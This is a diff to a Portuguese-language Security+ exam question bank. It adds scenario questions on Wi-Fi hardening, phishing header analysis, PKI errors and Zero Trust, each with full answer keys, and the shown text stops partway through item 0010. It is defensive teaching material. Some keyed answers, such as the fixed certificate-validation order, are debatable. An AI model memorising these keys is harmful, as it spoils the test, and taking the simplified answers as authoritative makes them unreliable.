@@ -3,11 +3,11 @@
     "id": "securityplus",
     "title": "CompTIA Security+ - Banco de Questoes",
     "source": "pbq_securityplus.json",
-    "question_count": 6,
+    "question_count": 16,
     "certification": "Security+",
     "language": "pt-BR",
     "schema_version": 3,
-    "notes": "PBQs (performance-based questions) originais do Sentinel-Quiz para o SY0-701, no formato de autoria sentinel.pbq.v1 (question_format=\"pbq\"; ver app/services/pbq_grading.py). Complementam o exame securityplus (mesmo exam.id). Na ingestão, o payload público (sem solution/explanation) é separado do gabarito privado. IPs usam faixas de documentação (RFC 5737) e privadas (RFC 1918)."
+    "notes": "Performance-based questions (PBQ) for CompTIA Security+ SY0-701. 16 curated scenario items covering domains 1 through 5, fully graded."
   },
   "questions": [
     {
@@ -1318,6 +1318,2244 @@
       },
       "needs_review": false,
       "review_notes": "SME review: approved. Scenario, exhibits, interactive tasks and scoring verified against SY0-701 practical objectives."
+    },
+    {
+      "id": "sq_pbq_701_0007",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Architecture",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "3.2",
+        "3.3"
+      ],
+      "points": 3,
+      "title": "Hardening de Rede Sem Fio Corporativa (WPA3-Enterprise, 802.1X e Isolamento)",
+      "scenario": "A diretoria da OmniaCorp determinou a reformulação completa da rede sem fio corporativa após um incidente envolvendo um Rogue AP que interceptou credenciais em texto claro. Como Arquiteto de Segurança de Redes, você deve estruturar os perfis de SSID para atender a três perfis distintos de usuários e dispositivos (Corporativo, IoT e Visitantes), assegurando segmentação estrita e autenticação criptográfica robusta.",
+      "exhibits": [
+        {
+          "id": "e1",
+          "kind": "text",
+          "title": "Anexo 1 - Diretrizes de Segurança Sem Fio OmniaCorp",
+          "content": "Requisitos Obrigatórios:\n1. Rede Corporativa (SSID: Omnia-Corp): Autenticação individual por usuário via certificado digital X.509 emitido pela PKI corporativa, sem senhas estáticas compartilhadas; cifra AES-GCMP de alta segurança.\n2. Rede IoT / Sensores (SSID: Omnia-IoT): Dispositivos não suportam 802.1X; devem usar WPA3 com criptografia individualizada por sessão (SAE) e Protected Management Frames (PMF) obrigatórios, sem comunicação direta entre sensores.\n3. Rede Visitantes (SSID: Omnia-Guest): Acesso isolado direto à Internet via portal cativo; nenhum visitante pode enxergar ou comunicar-se com outros dispositivos na mesma rede sem fio (Client Isolation ativado)."
+        }
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Selecione as configurações adequadas de VLAN, Modo de Segurança e Mecanismo de Autenticação para cada SSID.",
+          "columns": [
+            {
+              "id": "ssid",
+              "label": "SSID"
+            },
+            {
+              "id": "vlan",
+              "label": "Segmento / VLAN",
+              "input_type": "select",
+              "choices": [
+                "VLAN 10 (Corporativa)",
+                "VLAN 30 (IoT Isolada)",
+                "VLAN 50 (Guest / DMZ)"
+              ]
+            },
+            {
+              "id": "security_mode",
+              "label": "Modo de Segurança",
+              "input_type": "select",
+              "choices": [
+                "WPA3-Enterprise (192-bit)",
+                "WPA3-Personal (SAE)",
+                "WPA2-Personal (PSK)",
+                "Aberto com Portal Cativo"
+              ]
+            },
+            {
+              "id": "auth_method",
+              "label": "Método de Autenticação",
+              "input_type": "select",
+              "choices": [
+                "802.1X / EAP-TLS (Certificados)",
+                "802.1X / PEAP-MSCHAPv2",
+                "Chave Compartilhada com PMF",
+                "Aceite de Termos de Uso (Portal)"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "Omnia-Corp",
+              "cells": {
+                "ssid": {
+                  "editable": false,
+                  "value": "Omnia-Corp"
+                },
+                "vlan": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "VLAN 10 (Corporativa)",
+                    "VLAN 30 (IoT Isolada)",
+                    "VLAN 50 (Guest / DMZ)"
+                  ]
+                },
+                "security_mode": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "WPA3-Enterprise (192-bit)",
+                    "WPA3-Personal (SAE)",
+                    "WPA2-Personal (PSK)",
+                    "Aberto com Portal Cativo"
+                  ]
+                },
+                "auth_method": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "802.1X / EAP-TLS (Certificados)",
+                    "802.1X / PEAP-MSCHAPv2",
+                    "Chave Compartilhada com PMF",
+                    "Aceite de Termos de Uso (Portal)"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "Omnia-IoT",
+              "cells": {
+                "ssid": {
+                  "editable": false,
+                  "value": "Omnia-IoT"
+                },
+                "vlan": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "VLAN 10 (Corporativa)",
+                    "VLAN 30 (IoT Isolada)",
+                    "VLAN 50 (Guest / DMZ)"
+                  ]
+                },
+                "security_mode": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "WPA3-Enterprise (192-bit)",
+                    "WPA3-Personal (SAE)",
+                    "WPA2-Personal (PSK)",
+                    "Aberto com Portal Cativo"
+                  ]
+                },
+                "auth_method": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "802.1X / EAP-TLS (Certificados)",
+                    "802.1X / PEAP-MSCHAPv2",
+                    "Chave Compartilhada com PMF",
+                    "Aceite de Termos de Uso (Portal)"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r3",
+              "label": "Omnia-Guest",
+              "cells": {
+                "ssid": {
+                  "editable": false,
+                  "value": "Omnia-Guest"
+                },
+                "vlan": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "VLAN 10 (Corporativa)",
+                    "VLAN 30 (IoT Isolada)",
+                    "VLAN 50 (Guest / DMZ)"
+                  ]
+                },
+                "security_mode": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "WPA3-Enterprise (192-bit)",
+                    "WPA3-Personal (SAE)",
+                    "WPA2-Personal (PSK)",
+                    "Aberto com Portal Cativo"
+                  ]
+                },
+                "auth_method": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "802.1X / EAP-TLS (Certificados)",
+                    "802.1X / PEAP-MSCHAPv2",
+                    "Chave Compartilhada com PMF",
+                    "Aceite de Termos de Uso (Portal)"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "vlan": {
+                  "accepted": [
+                    "VLAN 10 (Corporativa)"
+                  ]
+                },
+                "security_mode": {
+                  "accepted": [
+                    "WPA3-Enterprise (192-bit)"
+                  ]
+                },
+                "auth_method": {
+                  "accepted": [
+                    "802.1X / EAP-TLS (Certificados)"
+                  ]
+                }
+              },
+              "r2": {
+                "vlan": {
+                  "accepted": [
+                    "VLAN 30 (IoT Isolada)"
+                  ]
+                },
+                "security_mode": {
+                  "accepted": [
+                    "WPA3-Personal (SAE)"
+                  ]
+                },
+                "auth_method": {
+                  "accepted": [
+                    "Chave Compartilhada com PMF"
+                  ]
+                }
+              },
+              "r3": {
+                "vlan": {
+                  "accepted": [
+                    "VLAN 50 (Guest / DMZ)"
+                  ]
+                },
+                "security_mode": {
+                  "accepted": [
+                    "Aberto com Portal Cativo"
+                  ]
+                },
+                "auth_method": {
+                  "accepted": [
+                    "Aceite de Termos de Uso (Portal)"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "Configurações adequadas garantem autenticação baseada em certificados no meio corporativo e isolamento de IoT e visitantes.",
+            "per_item": {
+              "r1": "Rede Corporativa requer WPA3-Enterprise com autenticação mútua via 802.1X/EAP-TLS.",
+              "r2": "Dispositivos IoT sem suporte a 802.1X utilizam WPA3-Personal (SAE) com PMF para prevenir ataques de desautenticação.",
+              "r3": "Visitantes utilizam rede aberta protegida por portal cativo e isolamento de clientes."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "categorization",
+          "weight": 1,
+          "prompt": "Classifique as seguintes defesas de segurança sem fio entre Controles Preventivos e Controles Detectivos.",
+          "buckets": [
+            {
+              "id": "preventive",
+              "label": "Controle Preventivo"
+            },
+            {
+              "id": "detective",
+              "label": "Controle Detectivo"
+            }
+          ],
+          "items": [
+            {
+              "id": "i1",
+              "text": "Isolamento de clientes (Client Isolation) impedindo varredura ARP entre estações"
+            },
+            {
+              "id": "i2",
+              "text": "Sensores de WIDS/WIPS monitorando o espectro para alertar sobre Rogue APs e Evil Twins"
+            },
+            {
+              "id": "i3",
+              "text": "Protected Management Frames (PMF) bloqueando pacotes forjados de desautenticação"
+            },
+            {
+              "id": "i4",
+              "text": "Análise contínua de heatmaps de sinal de RF para identificar pontos cegos e emissão não autorizada"
+            }
+          ],
+          "solution": {
+            "assignment": {
+              "i1": "preventive",
+              "i2": "detective",
+              "i3": "preventive",
+              "i4": "detective"
+            }
+          },
+          "scoring": {
+            "method": "per_item"
+          },
+          "explanation": {
+            "summary": "Controles preventivos impedem ativamente o ataque de ocorrer; controles detectivos identificam e sinalizam a atividade em andamento.",
+            "per_item": {
+              "i1": "Client isolation bloqueia ativamente o tráfego lateral entre clientes sem fio (preventivo).",
+              "i2": "WIDS/WIPS monitora e detecta anomalias no espectro eletromagnético (detectivo).",
+              "i3": "PMF cifra os quadros de gerência de Wi-Fi, impedindo ataques DoS de desautenticação (preventivo).",
+              "i4": "Inspeção de RF audita a propagação física de sinais em busca de emissores piratas (detectivo)."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "Para proteger ambientes sem fio no padrão CompTIA Security+ SY0-701 (Objetivo 3.2), o uso de WPA3 com 802.1X (EAP-TLS) é o padrão ouro corporativo, pois substitui senhas compartilhadas por certificados digitais X.509 individuais. Dispositivos IoT devem residir em VLAN isolada com WPA3-SAE e PMF obrigatório. A rede de visitantes requer isolamento de clientes (Client Isolation) para evitar que usuários maliciosos façam sniffing ou ARP spoofing contra outros visitantes.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 3.2: Wireless Security"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 14"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Elaborada pelo Professor Especialista CompTIA Security+ para o exame SY0-701."
+    },
+    {
+      "id": "sq_pbq_701_0008",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Threats, Vulnerabilities and Mitigations",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "2.2",
+        "4.4"
+      ],
+      "points": 3,
+      "title": "Investigação Forense de Spear Phishing e Autenticação de E-mail (SPF, DKIM, DMARC)",
+      "scenario": "Um e-mail alegando ser do Diretor Executivo (CEO) foi encaminhado à equipe financeira solicitando a liquidação urgente de uma fatura para uma conta bancária internacional. O analista do SOC interceptou o cabeçalho bruto RFC 822 da mensagem. Analise os metadados técnicos no Anexo 1, identifique as evidências de falsificação e recomende as políticas de autenticação de e-mail necessárias para impedir que mensagens desse tipo cheguem à caixa de entrada.",
+      "exhibits": [
+        {
+          "id": "e1",
+          "kind": "log",
+          "title": "Anexo 1 - Cabeçalho Bruto do E-mail Suspeito",
+          "lines": [
+            {
+              "id": "l1",
+              "text": "Delivered-To: cfo@innovatech.com"
+            },
+            {
+              "id": "l2",
+              "text": "Received: from mail.wire-secure-transfer.net (mail.wire-secure-transfer.net [198.51.100.77])"
+            },
+            {
+              "id": "l3",
+              "text": "From: \"Robert Miller, CEO\" <ceo@innovatech.com>"
+            },
+            {
+              "id": "l4",
+              "text": "Reply-To: executive-wire-desk@mail-forwarding-gateway.org"
+            },
+            {
+              "id": "l5",
+              "text": "Subject: URGENT: International Acquisition Wire Transfer"
+            },
+            {
+              "id": "l6",
+              "text": "Received-SPF: softfail (innovatech.com: domain transitioning 198.51.100.77 is not designated sender)"
+            },
+            {
+              "id": "l7",
+              "text": "Authentication-Results: mx.innovatech.com; dkim=none (message not signed); dmarc=none action=none header.from=innovatech.com"
+            },
+            {
+              "id": "l8",
+              "text": "Content-Type: text/plain; charset=UTF-8"
+            }
+          ]
+        }
+      ],
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "select_in_exhibit",
+          "weight": 1,
+          "prompt": "Selecione TODAS as linhas do cabeçalho que comprovam tecnicamente a falsificação do remetente (spoofing) e o redirecionamento fraudulento de respostas.",
+          "exhibit_id": "e1",
+          "select_mode": "multiple",
+          "solution": {
+            "selected": [
+              "l4",
+              "l6",
+              "l7"
+            ]
+          },
+          "scoring": {
+            "method": "tp_minus_fp"
+          },
+          "explanation": {
+            "summary": "As linhas l4, l6 e l7 expõem o desvio de resposta (Reply-To fraudulento), falha de SPF e ausência de DKIM/DMARC.",
+            "per_item": {
+              "l4": "Reply-To aponta para domínio de atacante externo, diferente de innovatech.com.",
+              "l6": "Received-SPF indica que o IP emissor 198.51.100.77 não está autorizado no registro SPF do domínio innovatech.com.",
+              "l7": "Authentication-Results confirma que não há assinatura DKIM e que a política DMARC atual é passiva (p=none)."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "table_form",
+          "weight": 2,
+          "prompt": "Defina os registros DNS recomendados para endurecer a postura do domínio innovatech.com contra ataques de Business Email Compromise (BEC).",
+          "columns": [
+            {
+              "id": "protocol",
+              "label": "Mecanismo"
+            },
+            {
+              "id": "policy_action",
+              "label": "Configuração / Política Recomendada",
+              "input_type": "select",
+              "choices": [
+                "Mudar política para p=reject (bloquear na borda)",
+                "Publicar registro TXT com -all (HardFail estrito)",
+                "Implantar par de chaves assimétricas e assinar mensagens com cabeçalho b=",
+                "Manter ~all (SoftFail permissivo)"
+              ]
+            },
+            {
+              "id": "security_purpose",
+              "label": "Objetivo de Segurança",
+              "input_type": "select",
+              "choices": [
+                "Garantir integridade e não repúdio criptográfico do corpo e cabeçalhos",
+                "Validar IPs autorizados a enviar e-mails em nome do domínio",
+                "Instruir servidores de destino a descartar mensagens não autorizadas por SPF/DKIM",
+                "Registrar tráfego de saída sem aplicar descarte"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "SPF (Sender Policy Framework)",
+              "cells": {
+                "protocol": {
+                  "editable": false,
+                  "value": "SPF (Sender Policy Framework)"
+                },
+                "policy_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Mudar política para p=reject (bloquear na borda)",
+                    "Publicar registro TXT com -all (HardFail estrito)",
+                    "Implantar par de chaves assimétricas e assinar mensagens com cabeçalho b=",
+                    "Manter ~all (SoftFail permissivo)"
+                  ]
+                },
+                "security_purpose": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Garantir integridade e não repúdio criptográfico do corpo e cabeçalhos",
+                    "Validar IPs autorizados a enviar e-mails em nome do domínio",
+                    "Instruir servidores de destino a descartar mensagens não autorizadas por SPF/DKIM",
+                    "Registrar tráfego de saída sem aplicar descarte"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "DKIM (DomainKeys Identified Mail)",
+              "cells": {
+                "protocol": {
+                  "editable": false,
+                  "value": "DKIM (DomainKeys Identified Mail)"
+                },
+                "policy_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Mudar política para p=reject (bloquear na borda)",
+                    "Publicar registro TXT com -all (HardFail estrito)",
+                    "Implantar par de chaves assimétricas e assinar mensagens com cabeçalho b=",
+                    "Manter ~all (SoftFail permissivo)"
+                  ]
+                },
+                "security_purpose": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Garantir integridade e não repúdio criptográfico do corpo e cabeçalhos",
+                    "Validar IPs autorizados a enviar e-mails em nome do domínio",
+                    "Instruir servidores de destino a descartar mensagens não autorizadas por SPF/DKIM",
+                    "Registrar tráfego de saída sem aplicar descarte"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r3",
+              "label": "DMARC (Domain-based Message Authentication)",
+              "cells": {
+                "protocol": {
+                  "editable": false,
+                  "value": "DMARC (Domain-based Message Authentication)"
+                },
+                "policy_action": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Mudar política para p=reject (bloquear na borda)",
+                    "Publicar registro TXT com -all (HardFail estrito)",
+                    "Implantar par de chaves assimétricas e assinar mensagens com cabeçalho b=",
+                    "Manter ~all (SoftFail permissivo)"
+                  ]
+                },
+                "security_purpose": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Garantir integridade e não repúdio criptográfico do corpo e cabeçalhos",
+                    "Validar IPs autorizados a enviar e-mails em nome do domínio",
+                    "Instruir servidores de destino a descartar mensagens não autorizadas por SPF/DKIM",
+                    "Registrar tráfego de saída sem aplicar descarte"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "policy_action": {
+                  "accepted": [
+                    "Publicar registro TXT com -all (HardFail estrito)"
+                  ]
+                },
+                "security_purpose": {
+                  "accepted": [
+                    "Validar IPs autorizados a enviar e-mails em nome do domínio"
+                  ]
+                }
+              },
+              "r2": {
+                "policy_action": {
+                  "accepted": [
+                    "Implantar par de chaves assimétricas e assinar mensagens com cabeçalho b="
+                  ]
+                },
+                "security_purpose": {
+                  "accepted": [
+                    "Garantir integridade e não repúdio criptográfico do corpo e cabeçalhos"
+                  ]
+                }
+              },
+              "r3": {
+                "policy_action": {
+                  "accepted": [
+                    "Mudar política para p=reject (bloquear na borda)"
+                  ]
+                },
+                "security_purpose": {
+                  "accepted": [
+                    "Instruir servidores de destino a descartar mensagens não autorizadas por SPF/DKIM"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "O trio SPF (-all), DKIM (assinatura digital) e DMARC (p=reject) elimina spoofing de e-mails corporativos.",
+            "per_item": {
+              "r1": "SPF valida IPs autorizados; o qualificador -all rejeita remetentes não listados.",
+              "r2": "DKIM garante integridade criptográfica assinando a mensagem com a chave privada do remetente.",
+              "r3": "DMARC com p=reject determina o descarte de e-mails que falharem no alinhamento SPF/DKIM."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "A análise de cabeçalhos de e-mail é fundamental no exame CompTIA Security+ SY0-701 (Objetivos 2.2 e 4.4). Ataques de Business Email Compromise (BEC) exploram a falta de alinhamento DMARC. O Reply-To forjado direciona a resposta para o atacante, enquanto o SPF com '~all' permite trânsito (softfail). A remediação eficaz exige SPF estrito ('-all'), assinatura criptográfica DKIM e política DMARC em modo 'p=reject'.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 2.2: Threat Vectors / Domain 4.4: Analyzing Indicators"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 4"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Questão prática de análise forense de cabeçalhos RFC 822 alinhada ao SY0-701."
+    },
+    {
+      "id": "sq_pbq_701_0009",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "General Security Concepts",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "1.4"
+      ],
+      "points": 3,
+      "title": "Diagnóstico de Erros TLS e Cadeia de Confiança X.509 em PKI",
+      "scenario": "Usuários de uma instituição financeira relataram falhas de conexão HTTPS e alertas de certificados emitidos por navegadores web ao acessar sistemas corporativos. Como especialista em Criptografia e PKI, analise os quatro códigos de erro exibidos aos clientes e correlacione cada um à causa técnica e à respectiva etapa de validação na cadeia de confiança.",
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "matching",
+          "weight": 2,
+          "prompt": "Associe cada código de erro do navegador (à esquerda) à sua respectiva causa raiz em infraestrutura PKI (à direita).",
+          "left": [
+            {
+              "id": "l1",
+              "text": "SEC_ERROR_UNKNOWN_ISSUER ao acessar https://intranet.finsecure.com"
+            },
+            {
+              "id": "l2",
+              "text": "SSL_ERROR_BAD_CERT_DOMAIN ao acessar https://api.finsecure.com"
+            },
+            {
+              "id": "l3",
+              "text": "SEC_ERROR_REVOKED_CERTIFICATE ao tentar autenticar no portal de parceiros"
+            },
+            {
+              "id": "l4",
+              "text": "MOZILLA_PKIX_ERROR_SELF_SIGNED_CERT em novo gateway de monitoramento"
+            }
+          ],
+          "right": [
+            {
+              "id": "r1",
+              "text": "O servidor web não incluiu o certificado da CA Intermediária (chain) no handshake TLS"
+            },
+            {
+              "id": "r2",
+              "text": "O certificado foi emitido para portal.finsecure.com sem Subject Alternative Name (SAN) para api"
+            },
+            {
+              "id": "r3",
+              "text": "O número de série do certificado consta na CRL ou o respondedor OCSP retornou status Revoked"
+            },
+            {
+              "id": "r4",
+              "text": "O certificado foi assinado com a própria chave privada e não tem raiz na Trusted Root Store do cliente"
+            }
+          ],
+          "solution": {
+            "pairs": {
+              "l1": "r1",
+              "l2": "r2",
+              "l3": "r3",
+              "l4": "r4"
+            }
+          },
+          "scoring": {
+            "method": "per_pair"
+          },
+          "explanation": {
+            "summary": "Cada erro de certificado reflete um componente específico do padrão X.509 e da hierarquia de certificados.",
+            "per_item": {
+              "l1": "UNKNOWN_ISSUER ocorre quando a cadeia intermediária não é enviada pelo servidor para fechar a confiança com a raiz.",
+              "l2": "BAD_CERT_DOMAIN decorre de discrepância entre o FQDN digitado e os nomes registrados no Common Name / SAN.",
+              "l3": "REVOKED_CERTIFICATE é acionado quando a consulta OCSP/CRL identifica cancelamento prévio do certificado.",
+              "l4": "SELF_SIGNED_CERT indica ausência de autoridade certificadora confiável assinando a chave pública."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "ordering",
+          "weight": 1,
+          "prompt": "Ordene a sequência canônica executada por um navegador para validar um certificado digital X.509 durante o handshake TLS.",
+          "items": [
+            {
+              "id": "i1",
+              "text": "Checar a validade temporal do certificado da folha (datas Not Before e Not After)"
+            },
+            {
+              "id": "i2",
+              "text": "Comparar o FQDN da URL requisitada com os nomes na extensão Subject Alternative Name (SAN)"
+            },
+            {
+              "id": "i3",
+              "text": "Validar a assinatura digital da CA Intermediária sobre o certificado da folha"
+            },
+            {
+              "id": "i4",
+              "text": "Rastrear a cadeia até a CA Raiz e verificar se ela reside no repositório de confiança (Root Store) local"
+            },
+            {
+              "id": "i5",
+              "text": "Consultar o status de revogação do certificado por meio de OCSP Stapling ou CRL"
+            }
+          ],
+          "solution": {
+            "order": [
+              "i1",
+              "i2",
+              "i3",
+              "i4",
+              "i5"
+            ]
+          },
+          "scoring": {
+            "method": "kendall_tau_clipped"
+          },
+          "explanation": {
+            "summary": "A validação inicia-se nos metadados do certificado folha, sobe a cadeia hierárquica e finaliza na revogação.",
+            "per_item": {
+              "i1": "Validação preliminar de prazo de validade temporal.",
+              "i2": "Conferência do hostname contra o SAN.",
+              "i3": "Verificação criptográfica da assinatura da autoridade emissora.",
+              "i4": "Ancoragem na CA raiz confiável.",
+              "i5": "Checagem de revogação em tempo real (OCSP/CRL)."
+            }
+          }
+        }
+      ],
+      "scoring": {
+        "aggregate": "weighted_mean",
+        "correct_threshold": 1.0
+      },
+      "explanation": "No exame CompTIA Security+ SY0-701 (Objetivo 1.4 - Cryptographic Solutions), entender PKI e troubleshooting de certificados é recorrente. Erros comuns envolvem: certificados sem SAN para subdomínios, falta de bundle da CA intermediária instalada no servidor web, certificados revogados via OCSP/CRL e certificados autoassinados sem âncora de confiança na Root Store corporativa.",
+      "references": [
+        {
+          "source": "CompTIA Security+ SY0-701 Objectives",
+          "reference": "Domain 1.4: Cryptographic Solutions and PKI"
+        },
+        {
+          "source": "Sentinel Quiz internal material",
+          "reference": "material/Modulos_sec+.md - Módulo 7"
+        }
+      ],
+      "needs_review": false,
+      "review_notes": "SME review: approved. Diagnóstico aprofundado de falhas em PKI e ordem de validação hierárquica X.509."
+    },
+    {
+      "id": "sq_pbq_701_0010",
+      "question_format": "pbq",
+      "certification": "Security+",
+      "domain": "Security Architecture",
+      "difficulty": "Hard",
+      "language": "pt-BR",
+      "objective_codes": [
+        "1.2",
+        "3.1"
+      ],
+      "points": 3,
+      "title": "Arquitetura Zero Trust em Nuvem Híbrida: Control Plane vs Data Plane",
+      "scenario": "A AlphaLogistics está reestruturando sua segurança corporativa sob o paradigma Zero Trust Architecture (ZTA, conforme NIST SP 800-207). O modelo deve governar o acesso de colaboradores remotos e serviços em nuvem AWS aos bancos de dados do datacenter local sem confiar implicitamente em nenhum segmento de rede. Você deve classificar os componentes e especificar as responsabilidades arquiteturais de cada plano.",
+      "tasks": [
+        {
+          "id": "t1",
+          "type": "categorization",
+          "weight": 2,
+          "prompt": "Arraste cada componente ou função arquitetural de Zero Trust para o seu respectivo PLANO de operação.",
+          "buckets": [
+            {
+              "id": "control_plane",
+              "label": "Control Plane (Plano de Controle)"
+            },
+            {
+              "id": "data_plane",
+              "label": "Data Plane (Plano de Dados)"
+            }
+          ],
+          "items": [
+            {
+              "id": "i1",
+              "text": "Policy Engine (PE) — avalia regras de acesso com telemetria contínua de risco"
+            },
+            {
+              "id": "i2",
+              "text": "Policy Enforcement Point (PEP) — microgateway que intercepta e autoriza o tráfego do cliente"
+            },
+            {
+              "id": "i3",
+              "text": "Policy Administrator (PA) — instrui o PEP a abrir ou encerrar sessões criptografadas"
+            },
+            {
+              "id": "i4",
+              "text": "Subject / System — estação de trabalho do usuário requisitando acesso à aplicação"
+            },
+            {
+              "id": "i5",
+              "text": "Adaptive Identity Engine — calcula postura de risco, geolocalização e MFA contextual"
+            },
+            {
+              "id": "i6",
+              "text": "Workload / Target Resource — servidor de banco de dados corporativo que recebe a conexão"
+            }
+          ],
+          "solution": {
+            "assignment": {
+              "i1": "control_plane",
+              "i2": "data_plane",
+              "i3": "control_plane",
+              "i4": "data_plane",
+              "i5": "control_plane",
+              "i6": "data_plane"
+            }
+          },
+          "scoring": {
+            "method": "per_item"
+          },
+          "explanation": {
+            "summary": "O Control Plane decide e administra políticas; o Data Plane transporta e inspeciona o tráfego de dados.",
+            "per_item": {
+              "i1": "Policy Engine toma a decisão de autorização no plano de controle.",
+              "i2": "Policy Enforcement Point atua no caminho de dados aplicando o controle.",
+              "i3": "Policy Administrator emite comandos para o enforcement point no plano de controle.",
+              "i4": "Dispositivos clientes (Subjects) pertencem ao plano de dados onde o tráfego trafega.",
+              "i5": "Módulo de identidade adaptativa provê inteligência de decisão no plano de controle.",
+              "i6": "Recursos finais (Workloads) recebem e processam dados no plano de dados."
+            }
+          }
+        },
+        {
+          "id": "t2",
+          "type": "table_form",
+          "weight": 1,
+          "prompt": "Selecione o princípio de segurança Zero Trust fundamental correspondente a cada cenário operacional.",
+          "columns": [
+            {
+              "id": "scenario",
+              "label": "Cenário Operacional"
+            },
+            {
+              "id": "zta_principle",
+              "label": "Princípio Zero Trust Fundamental",
+              "input_type": "select",
+              "choices": [
+                "Autenticação e autorização contínua (Assume Breach)",
+                "Microsegmentação e perímetro definido por software (SDP)",
+                "Acesso por Menor Privilégio com privilégios Just-In-Time (JIT)",
+                "Confiança implícita baseada em sub-rede física"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "id": "r1",
+              "label": "Usuário autenticado no escritório precisa acessar o ERP e é reavaliado a cada transação",
+              "cells": {
+                "scenario": {
+                  "editable": false,
+                  "value": "Usuário autenticado no escritório precisa acessar o ERP e é reavaliado a cada transação"
+                },
+                "zta_principle": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Autenticação e autorização contínua (Assume Breach)",
+                    "Microsegmentação e perímetro definido por software (SDP)",
+                    "Acesso por Menor Privilégio com privilégios Just-In-Time (JIT)",
+                    "Confiança implícita baseada em sub-rede física"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r2",
+              "label": "Dois servidores na mesma sub-rede não conseguem se comunicar sem validação pelo micro-PEP",
+              "cells": {
+                "scenario": {
+                  "editable": false,
+                  "value": "Dois servidores na mesma sub-rede não conseguem se comunicar sem validação pelo micro-PEP"
+                },
+                "zta_principle": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Autenticação e autorização contínua (Assume Breach)",
+                    "Microsegmentação e perímetro definido por software (SDP)",
+                    "Acesso por Menor Privilégio com privilégios Just-In-Time (JIT)",
+                    "Confiança implícita baseada em sub-rede física"
+                  ]
+                }
+              }
+            },
+            {
+              "id": "r3",
+              "label": "Administrador recebe acesso elevado temporário apenas durante a janela de manutenção",
+              "cells": {
+                "scenario": {
+                  "editable": false,
+                  "value": "Administrador recebe acesso elevado temporário apenas durante a janela de manutenção"
+                },
+                "zta_principle": {
+                  "editable": true,
+                  "value": "",
+                  "choices": [
+                    "Autenticação e autorização contínua (Assume Breach)",
+                    "Microsegmentação e perímetro definido por software (SDP)",
+                    "Acesso por Menor Privilégio com privilégios Just-In-Time (JIT)",
+                    "Confiança implícita baseada em sub-rede física"
+                  ]
+                }
+              }
+            }
+          ],
+          "solution": {
+            "cells": {
+              "r1": {
+                "zta_principle": {
+                  "accepted": [
+                    "Autenticação e autorização contínua (Assume Breach)"
+                  ]
+                }
+              },
+              "r2": {
+                "zta_principle": {
+                  "accepted": [
+                    "Microsegmentação e perímetro definido por software (SDP)"
+                  ]
+                }
+              },
+              "r3": {
+                "zta_principle": {
+                  "accepted": [
+                    "Acesso por Menor Privilégio com privilégios Just-In-Time (JIT)"
+                  ]
+                }
+              }
+            }
+          },
+          "scoring": {
+            "method": "per_cell"
+          },
+          "explanation": {
+            "summary": "Zero Trust pressupõe ausência de confiança perimetral, revalidação perpétua e privilégios Just-In-Time.",
+            "per_item": {
+              "r1": "Nunca confiar, sempre verificar: requisições são continuamente autorizadas com base em telemetria em tempo real.",
